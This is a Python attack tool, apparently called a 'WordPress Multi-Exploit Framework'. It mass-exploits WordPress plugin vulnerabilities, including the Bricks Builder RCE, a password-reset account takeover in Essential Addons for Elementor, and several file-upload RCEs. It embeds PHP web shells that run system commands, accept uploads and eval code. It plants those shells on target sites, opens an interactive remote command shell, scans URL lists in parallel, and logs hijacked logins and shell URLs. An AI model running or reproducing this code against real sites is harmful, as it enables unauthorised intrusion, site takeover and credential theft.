#!/usr/bin/env python3
import requests
import re
import time
import os
import sys
import json
import random
import base64
import threading
import argparse
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from alive_progress import alive_bar

# Color setup
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

color = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables
SHELL_PASSWORD = "K3ysTr0K3R_2024"

# Powerful PHP Shell
POWERFUL_SHELL = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{
        $c = base64_decode($_REQUEST['cmd']);
        if(function_exists('system')){{ system($c); }}
        elseif(function_exists('exec')){{ exec($c,$o); echo implode("\\n",$o); }}
        elseif(function_exists('shell_exec')){{ echo shell_exec($c); }}
        elseif(function_exists('passthru')){{ passthru($c); }}
        die;
    }}
    if(isset($_FILES['f'])){{
        move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
        echo "Uploaded: " . $_FILES['f']['name'];
        die;
    }}
    if(isset($_POST['code'])){{
        eval(base64_decode($_POST['code']));
        die;
    }}
    if(isset($_REQUEST['info'])){{
        phpinfo();
        die;
    }}
    echo "Shell Active";
}}
?>"""

# Simple shell for initial upload
SIMPLE_SHELL = f"""<?php
$p="{SHELL_PASSWORD}";
if(isset($_REQUEST['p'])&&$_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{ system(base64_decode($_REQUEST['cmd'])); die; }}
    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
    if(isset($_POST['code'])){{ eval(base64_decode($_POST['code'])); die; }}
    echo "Shell Active";
}}
?>"""

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
}

# Bricks Builder paths
BRICKS_PATHS = [
    "/wp-json/bricks/v1/render_element",
    "/?rest_route=/bricks/v1/render_element"
]

class WordPressExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def verify_shell(self, url, retries=3):
        """Verify if shell is working with actual command execution"""
        for attempt in range(retries):
            try:
                test_cmd = base64.b64encode(b'echo SHELL_TEST_12345').decode()
                test_url = f"{url}?p={SHELL_PASSWORD}&cmd={test_cmd}"
                
                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                if resp.status_code == 200:
                    try:
                        decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
                        if 'SHELL_TEST_12345' in decoded:
                            return True
                    except:
                        if 'SHELL_TEST_12345' in resp.text or 'Shell Active' in resp.text:
                            return True
                
                resp2 = self.session.get(f"{url}?p={SHELL_PASSWORD}", timeout=10)
                if resp2.status_code == 200:
                    if 'Shell Active' in resp2.text or 'Enhanced Web Shell' in resp2.text:
                        return True
                        
                time.sleep(1)
            except:
                continue
        
        return False
    
    def fetch_bricks_nonce(self, target):
        """Fetch nonce for Bricks Builder exploit"""
        try:
            response = self.session.get(target, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            script_tag = soup.find("script", id="bricks-scripts-js-extra")
            if script_tag:
                match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
                if match:
                    return match.group(1)
            return None
        except Exception:
            return None
    
    def create_bricks_element(self, nonce, command=None):
        """Create element for Bricks Builder exploit"""
        if command:
            return {
                "postId": "1",
                "nonce": nonce,
                "element": {
                    "name": "code",
                    "settings": {
                        "executeCode": "true",
                        "code": f"<?php throw new Exception(`{command}`);?>"
                    }
                }
            }
        else:
            return {
                "postId": "1",
                "nonce": nonce,
                "element": {
                    "name": "container",
                    "settings": {
                        "hasLoop": "true",
                        "query": {
                            "useQueryEditor": True,
                            "queryEditor": "throw new Exception(`echo SHELL_TEST_12345`);",
                            "objectType": "post"
                        }
                    }
                }
            }
    
    def exploit_bricks_builder(self, target_url):
        """CVE-2024-25600 - Bricks Builder RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting Bricks Builder (CVE-2024-25600)...")
        
        nonce = self.fetch_bricks_nonce(target_url)
        if not nonce:
            print(f"    {RED}[-]{RESET} Could not fetch nonce")
            return False, None
        
        print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
        
        # Test vulnerability
        test_element = self.create_bricks_element(nonce)
        
        for path in BRICKS_PATHS:
            try:
                resp = self.session.post(target_url + path, json=test_element, timeout=10)
                
                if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                    print(f"    {GREEN}[✓]{RESET} Target is vulnerable!")
                    
                    # Try to upload shell using command execution
                    shell_name = f"shell_{random.randint(1000,9999)}.php"
                    
                    # Create PHP file using echo command
                    encoded_shell = base64.b64encode(SIMPLE_SHELL.encode()).decode()
                    create_cmd = f"echo '{encoded_shell}' | base64 -d > {shell_name}"
                    
                    cmd_element = self.create_bricks_element(nonce, create_cmd)
                    resp = self.session.post(target_url + path, json=cmd_element, timeout=10)
                    
                    if resp.status_code == 200:
                        shell_url = urljoin(target_url, shell_name)
                        if self.verify_shell(shell_url):
                            print(f"    {GREEN}[✓]{RESET} Shell uploaded and verified!")
                            print(f"    {CYAN}[→]{RESET} URL: {shell_url}")
                            return True, shell_url
                    
                    return False, None
            except:
                continue
        
        return False, None
    
    def exploit_cve_2023_32243(self, target_url):
        """CVE-2023-32243 - Essential Addons for Elementor Authentication Bypass"""
        print(f"  {CYAN}[*]{RESET} Exploiting CVE-2023-32243...")
        
        clean_url = target_url.replace('http://', '').replace('https://', '')
        
        try:
            # Get username
            user = None
            
            try:
                resp = self.session.get(f'http://{clean_url}/wp-json/wp/v2/users', timeout=10)
                if '"slug":"' in resp.text:
                    users = re.findall('"slug":"(.*?)"', resp.text)
                    if users:
                        user = users[0]
                        print(f"    {GREEN}[+]{RESET} Username found: {user}")
            except:
                pass
            
            if not user:
                try:
                    resp = self.session.get(f'http://{clean_url}/author-sitemap.xml', timeout=10)
                    if 'Sitemap' in resp.text:
                        users = re.findall('author/(.*?)/', resp.text)
                        if users:
                            user = users[0]
                            print(f"    {GREEN}[+]{RESET} Username found: {user}")
                except:
                    pass
            
            if not user:
                print(f"    {RED}[-]{RESET} Could not find username")
                return False, None
            
            # Get nonce
            response = self.session.get(f'http://{clean_url}', timeout=10).text
            nonce_match = re.findall('admin-ajax.php","nonce":"(.*?)"', response)
            if not nonce_match:
                print(f"    {RED}[-]{RESET} Could not find nonce")
                return False, None
            
            nonce = nonce_match[0]
            
            # Reset password
            payload = {
                "action": "login_or_register_user",
                "eael-resetpassword-submit": "true",
                "page_id": "124",
                "widget_id": "224",
                "eael-resetpassword-nonce": nonce,
                "eael-pass1": SHELL_PASSWORD,
                "eael-pass2": SHELL_PASSWORD,
                "rp_login": user
            }
            
            resp = self.session.post(f'http://{clean_url}/wp-admin/admin-ajax.php', data=payload, timeout=10)
            
            if 'success":true' in resp.text:
                print(f"    {GREEN}[✓]{RESET} Password reset successful!")
                print(f"    {CYAN}[→]{RESET} Login: http://{clean_url}/wp-login.php | {user}:{SHELL_PASSWORD}")
                
                with open('cve_2023_32243_results.txt', 'a') as f:
                    f.write(f"http://{clean_url}/wp-login.php|{user}|{SHELL_PASSWORD}\n")
                
                return True, f"Credentials: {user}:{SHELL_PASSWORD}"
            else:
                return False, None
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, None
    
    def exploit_pix_woocommerce(self, target_url):
        """CVE-2026-3891 - Pix for WooCommerce RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting Pix for WooCommerce...")
        
        base_url = target_url.rstrip('/')
        
        try:
            # Get nonce
            nonce_resp = self.session.post(
                f"{base_url}/wp-admin/admin-ajax.php",
                data={"action": "lkn_pix_for_woocommerce_generate_nonce"},
                timeout=10
            )
            
            try:
                nonce_data = nonce_resp.json()
                nonce = nonce_data.get('data', {}).get('nonce')
                if not nonce:
                    return False, None
            except:
                return False, None
            
            # Upload shell
            files = {
                'certificate_crt_path': ('shell.php', SIMPLE_SHELL, 'application/x-php')
            }
            data = {
                'action': 'lkn_pix_for_woocommerce_c6_save_settings',
                '_ajax_nonce': nonce,
                'settings': json.dumps({'enabled': 'yes'})
            }
            
            resp = self.session.post(f"{base_url}/wp-admin/admin-ajax.php", files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                shell_url = f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php"
                if self.verify_shell(shell_url):
                    print(f"    {GREEN}[✓]{RESET} Shell verified!")
                    return True, shell_url
            
            return False, None
        except Exception as e:
            return False, None
    
    def exploit_mpmf_rce(self, target_url):
        """CVE-2024-50526 - MPMF RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting MPMF RCE...")
        
        base_url = target_url.rstrip('/')
        
        # Detect form name
        form_names = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
        detected_form = None
        
        for fname in form_names:
            try:
                resp = self.session.get(f"{base_url}/?form_name={fname}", timeout=5)
                if resp.status_code == 200 and 'mpmf' in resp.text.lower():
                    detected_form = fname
                    break
            except:
                continue
        
        if not detected_form:
            return False, None
        
        # Upload shell
        files = {
            'file1': ('shell.php', SIMPLE_SHELL, 'application/x-php')
        }
        data = {
            'form_name': detected_form,
            'mpmf_form_id': '1',
            'custom_form_action': 'send_data',
            'send': 'Submit'
        }
        
        try:
            resp = self.session.post(f"{base_url}/mpmf-1/", files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                test_paths = [
                    f"{base_url}/wp-content/uploads/mpmf_uploads/shell.php",
                    f"{base_url}/wp-content/uploads/shell.php",
                    f"{base_url}/uploads/mpmf_uploads/shell.php",
                ]
                
                for test_url in test_paths:
                    if self.verify_shell(test_url):
                        return True, test_url
            
            return False, None
        except:
            return False, None
    
    def exploit_woocommerce_upload(self, target_url):
        """CVE-2024-51793 - WooCommerce Upload RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting WooCommerce upload...")
        
        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
        
        files = {
            'file': ('shell.php', SIMPLE_SHELL, 'image/jpeg')
        }
        data = {
            'action': 'wc_upload_file_ajax'
        }
        
        try:
            resp = self.session.post(ajax_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                url_match = re.search(r'(https?://[^\s\'"<>]+\.php)', resp.text)
                if url_match:
                    shell_url = url_match.group(1)
                    if self.verify_shell(shell_url):
                        return True, shell_url
            
            return False, None
        except:
            return False, None
    
    def exploit_wp_file_manager(self, target_url):
        """CVE-2020-25213 - WP File Manager RCE"""
        print(f"  {CYAN}[*]{RESET} Exploiting WP File Manager...")
        
        connector_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
        
        try:
            check_resp = self.session.get(connector_url, timeout=5)
            if check_resp.status_code != 200:
                return False, None
            
            shell_name = f"shell_{random.randint(1000,9999)}.php"
            files = {
                'upload[]': (shell_name, SIMPLE_SHELL, 'application/x-php')
            }
            data = {
                'reqid': str(random.randint(10000,99999)),
                'cmd': 'upload',
                'target': 'l1_Lw'
            }
            
            resp = self.session.post(connector_url, files=files, data=data, timeout=30)
            
            if resp.status_code == 200:
                shell_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
                if self.verify_shell(shell_url):
                    return True, shell_url
            
            return False, None
        except:
            return False, None
    
    def interactive_bricks_shell(self, target_url, nonce):
        """Interactive shell for Bricks Builder"""
        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
        print(f"  {YELLOW}[!]{RESET} Type 'exit' to quit\n")
        
        session = PromptSession(history=InMemoryHistory())
        
        while True:
            try:
                command = session.prompt(
                    HTML("<ansired><b>BricksShell> </b></ansired>"),
                    auto_suggest=AutoSuggestFromHistory(),
                )
                if command.lower() == "exit":
                    break
                
                for path in BRICKS_PATHS:
                    try:
                        element = self.create_bricks_element(nonce, command)
                        response = self.session.post(target_url + path, json=element, timeout=10)
                        output = response.json().get('data', {}).get('html', '')
                        cleaned_output = output.replace("Exception: ", "")
                        if cleaned_output:
                            print(cleaned_output)
                            break
                    except:
                        continue
            except KeyboardInterrupt:
                break
    
    def run_all_exploits(self, target_url):
        """Run all exploits"""
        print(f"\n{YELLOW}[*]{RESET} Testing exploits on: {target_url}")
        
        # Try Bricks Builder first (interactive shell)
        print(f"\n  {BLUE}[▶]{RESET} Trying Bricks Builder (CVE-2024-25600)...")
        nonce = self.fetch_bricks_nonce(target_url)
        if nonce:
            # Test if vulnerable
            test_element = self.create_bricks_element(nonce)
            for path in BRICKS_PATHS:
                try:
                    resp = self.session.post(target_url + path, json=test_element, timeout=10)
                    if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                        print(f"  {GREEN}[✓]{RESET} Bricks Builder is vulnerable!")
                        self.interactive_bricks_shell(target_url, nonce)
                        return True, "Interactive shell opened"
                except:
                    continue
        
        # Try other exploits
        exploits = [
            ('CVE-2023-32243 (Auth Bypass)', self.exploit_cve_2023_32243),
            ('CVE-2026-3891 (Pix for WooCommerce)', self.exploit_pix_woocommerce),
            ('CVE-2024-50526 (MPMF RCE)', self.exploit_mpmf_rce),
            ('CVE-2024-51793 (WooCommerce Upload)', self.exploit_woocommerce_upload),
            ('CVE-2020-25213 (WP File Manager)', self.exploit_wp_file_manager),
        ]
        
        for exploit_name, exploit_func in exploits:
            print(f"\n  {BLUE}[▶]{RESET} Trying {exploit_name}...")
            success, result = exploit_func(target_url)
            
            if success:
                print(f"\n  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                print(f"  {GREEN}[✓] SUCCESS!{RESET} {exploit_name}")
                print(f"  {GREEN}[✓] Result:{RESET} {result}")
                print(f"  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
                return True, result
        
        return False, None

def ascii_art():
    color.print("""[yellow]
   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    [/yellow]""", style="bold")
    print("Coded By: K3ysTr0K3R & Enhanced with Multiple CVEs")
    print("Exploits: CVE-2024-25600 | CVE-2023-32243 | CVE-2026-3891 | CVE-2024-50526 | CVE-2024-51793 | CVE-2020-25213")
    print("")

def scan_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file if url.strip()]
        if not urls:
            color.print("[bold bright_red][~][/bold bright_red] No URLs found in the file.")
            return
    
    exploiter = WordPressExploiter()
    results = []
    
    with alive_bar(len(urls), title="Scanning Targets", bar="smooth", enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(exploiter.run_all_exploits, url): url for url in urls}
            
            for future in as_completed(futures):
                url = futures[future]
                try:
                    success, result = future.result(timeout=180)
                    if success:
                        results.append({'url': url, 'result': result})
                        color.print(f"\n[bold bright_green][+][/bold bright_green] Success: {url}")
                except Exception as e:
                    color.print(f"\n[bold bright_red][-][/bold bright_red] Failed: {url} - {str(e)}")
                bar()
    
    # Save results
    if results:
        with open('exploit_results.txt', 'w') as f:
            for result in results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Result: {result['result']}\n")
                f.write("-" * 50 + "\n")
        
        color.print(f"\n[bold bright_green][+][/bold bright_green] Results saved to exploit_results.txt")

def main():
    ascii_art()
    
    parser = argparse.ArgumentParser(description='WordPress Multi-Exploit Framework')
    parser.add_argument('-u', '--url', help='Target URL to exploit')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-f', '--file', help='File containing URLs to scan')
    
    args = parser.parse_args()
    
    exploiter = WordPressExploiter()
    
    if args.url:
        success, result = exploiter.run_all_exploits(args.url)
        if not success:
            color.print("[bold bright_red][~][/bold bright_red] No exploits succeeded")
    elif args.file:
        scan_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        color.print("\n[bold bright_yellow][!][/bold bright_yellow] Interrupted by user")
    except Exception as e:
        color.print(f"\n[bold bright_red][!][/bold bright_red] Fatal error: {e}")
